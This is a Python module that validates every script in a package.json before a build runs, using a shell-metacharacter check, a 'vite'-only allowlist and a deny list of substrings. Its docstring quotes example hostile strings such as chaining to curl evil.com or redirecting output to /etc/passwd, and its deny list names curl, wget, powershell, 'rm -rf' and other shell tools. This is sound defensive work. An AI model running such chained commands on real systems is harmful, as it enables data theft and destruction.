"""
Deterministic command validator — Phase 4, Sections 4, 9, 23.

Runs against every script in package.json's `scripts` object — not just
`build`, and not just whichever script we're about to invoke. npm
automatically runs `pre<name>`/`post<name>` lifecycle hooks for any script
name when its counterpart runs, so a script we never intend to call
directly (e.g. a smuggled `"preinstall"` or `"postbuild"`) can still
execute. Validating only the scripts we plan to run would miss that.

Three layers, all of which a script must pass:
1. No shell metacharacters/operators anywhere in the string — rejects
   command chaining and redirection (`vite build && curl evil.com`,
   `vite build > /etc/passwd`) that would otherwise slip past a check
   that only looks at the first token.
2. Tokenize with `shlex.split()` (correct quote handling, unlike a naive
   `.split()`) and require the first token to be on a short allowlist —
   for this MVP, just `vite`. Nothing else should legitimately appear as
   a script's command name in a locked react-vite project.
3. A substring scan for explicitly named dangerous commands, as
   defense-in-depth on top of 1 and 2, not a replacement for them.
"""
import re
import shlex

_ALLOWED_COMMANDS = {"vite"}

# Reject if any of these appear anywhere in a script string.
_SHELL_METACHARACTERS = re.compile(r"(&&|\|\||[;|`]|\$\(|>|<)")

# Defense-in-depth substring scan (Section 23's explicit examples), on top
# of — not instead of — the allowlist + metacharacter checks above.
_DANGEROUS_SUBSTRINGS = [
    "curl", "wget", "invoke-webrequest", "powershell", "bash -c", "sh -c",
    "rm -rf", "format ", "del ", "reg ", "ssh ", "git ", "python", "cmd",
]


class UnsafeScriptError(Exception):
    """Raised with a human-readable reason — becomes a `blocked` BuildResult,
    never an executed command."""


def validate_package_scripts(package_json: dict) -> None:
    """Raise UnsafeScriptError if any script in `package_json["scripts"]`
    looks unsafe. Validates every script present, regardless of which one
    the caller is about to run — see module docstring for why."""
    scripts = package_json.get("scripts")
    if not isinstance(scripts, dict):
        return  # absence/shape is project/validator.py's concern, not ours

    for name, command in scripts.items():
        if not isinstance(command, str):
            raise UnsafeScriptError(f"Script '{name}' is not a string.")
        _validate_single_script(name, command)


def _validate_single_script(name: str, command: str) -> None:
    if _SHELL_METACHARACTERS.search(command):
        raise UnsafeScriptError(
            f"Script '{name}' contains a shell operator ({command!r}) — "
            "command chaining/redirection is not allowed."
        )

    lowered = command.lower()
    for pattern in _DANGEROUS_SUBSTRINGS:
        if pattern in lowered:
            raise UnsafeScriptError(f"Script '{name}' contains a disallowed command pattern: {pattern!r}.")

    try:
        tokens = shlex.split(command)
    except ValueError as exc:
        # Unbalanced quotes etc. — malformed, not safely executable.
        raise UnsafeScriptError(f"Script '{name}' could not be parsed as a shell command: {exc}") from None

    if not tokens:
        raise UnsafeScriptError(f"Script '{name}' is empty.")
    if tokens[0] not in _ALLOWED_COMMANDS:
        raise UnsafeScriptError(
            f"Script '{name}' runs '{tokens[0]}', which isn't on the allowed command list "
            f"({sorted(_ALLOWED_COMMANDS)}) for this project's tech stack."
        )
